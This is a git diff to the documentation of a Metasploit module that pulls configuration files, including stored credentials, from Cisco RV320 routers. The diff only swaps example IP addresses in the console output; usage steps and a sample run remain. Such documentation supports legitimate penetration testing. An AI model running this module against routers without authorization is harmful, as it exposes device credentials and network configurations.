@@ -15,7 +15,7 @@ More context is available from [Rapid7's blog post](https://blog.rapid7.com/2019
  4. `run`
  5. Review the downloaded configuration file cited in the output.  For example:
 >```
->[+] Stored configuration (128658 bytes) to /home/administrator/.msf4/loot/20190206213439_default_172.16.0.34_cisco.rv.config_791561.txt
+>[+] Stored configuration (128658 bytes) to /home/administrator/.msf4/loot/20190206213439_default_192.168.1.1_cisco.rv.config_791561.txt
 >```
  6. If the database is connected, review the `hosts`, `creds`, and `loot` commands
 
@@ -54,7 +54,7 @@ msf5 auxiliary(gather/cisco_rv320_config) > set SSL false
 SSL => false
 msf5 auxiliary(gather/cisco_rv320_config) > run
 
-[+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_192.168.1.1_cisco.rv.config_434637.txt
+[+] Stored configuration (128628 bytes) to /home/administrator/.msf4/loot/20190206165015_default_203.0.113.54_cisco.rv.config_434637.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
